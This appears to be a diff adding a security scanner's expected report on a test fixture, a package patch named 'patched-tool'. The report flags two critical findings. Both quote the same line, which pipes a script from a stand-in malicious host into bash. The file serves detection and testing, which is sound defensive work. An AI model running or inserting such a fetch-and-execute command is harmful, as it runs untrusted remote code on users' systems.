@@ -1,0 +1,27 @@
+
+Scan Results: patched-tool
+============================================================
+
+[CRITICAL] DLE-001 Curl pipe to shell (source sidecar)
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/payload-in-patch/0001-fix.patch:5
+    Code: +	curl -s https://cdn.evil.example/implant.sh | bash
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://cdn.evil.example/implant.sh (install script)
+    This package downloads and executes code from https://cdn.evil.example/implant.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/payload-in-patch/0001-fix.patch:5
+    Code: +	curl -s https://cdn.evil.example/implant.sh | bash
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+
+
+============================================================
+Package: patched-tool v1.0-1
+Scan duration: 21ms
+
+Found 2 issue(s):
+  2 CRITICAL
+============================================================
